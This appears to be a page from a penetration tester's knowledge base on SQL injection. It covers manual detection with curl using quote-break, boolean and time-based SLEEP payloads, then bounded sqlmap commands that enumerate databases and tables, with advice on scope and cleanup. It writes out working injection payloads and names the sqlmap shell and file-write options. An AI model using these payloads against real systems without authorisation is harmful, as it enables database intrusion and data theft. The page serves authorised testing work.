---
title: SQL injection (manual + sqlmap)
slug: sql-injection
category: techniques
updated: 2026-11-18
summary: "Detect and confirm SQL injection by hand (error, boolean, time-based), then use sqlmap with bounded flags"
tags: [web, sqli, sqlmap, boolean, time-based, union]
sensitive: false
---

# SQL injection (manual + sqlmap)

## When to use
A parameter (query string, form field, JSON key, header, cookie) reaches a SQL
query. Confirm by hand first; use sqlmap only once the injection point is proven.

## Detect by hand
```bash
# Quote break: an error or a changed response is a lead, not a finding
curl -s "http://TARGET/item?id=1'"
curl -s "http://TARGET/item?id=1 AND 1=1"     # baseline
curl -s "http://TARGET/item?id=1 AND 1=2"     # should differ from the baseline

# Time-based oracle (MySQL example): ~5 s delay means the condition is true
curl -s -o /dev/null -w "%{time_total}\n" "http://TARGET/item?id=1 AND SLEEP(5)"
```

## Confirm and bound with sqlmap
```bash
sqlmap -u "http://TARGET/item?id=1" --batch --level 2 --risk 1 --current-db
sqlmap -u "http://TARGET/item?id=1" --batch -D APPDB --tables
# Keep it read-only: avoid --os-shell, --file-write and --sql-shell unless the
# engagement scope explicitly lists them as objectives.
```

## Gotchas
- A 500 error on a single quote is a lead; a boolean difference that repeats
  across three runs is evidence. Record both.
- Compare response length and content, not only the status code: many apps
  return 200 with an error message in the body.
- Use the same session cookie and CSRF token that sqlmap is given, or every
  request will fail with a generic redirect.
- Keep `--risk` and `--level` at the lowest values that prove the point. Higher
  values send far more requests and can trigger lockouts or alerts.

## Cleanup / rollback
- Read-only extraction leaves no change. If a write primitive was used, record
  the table or file touched and remove it, then note the rollback in the report.

## References
- Related: [[service-enumeration]], [[prompt-injection]]
- sqlmap documentation (public).
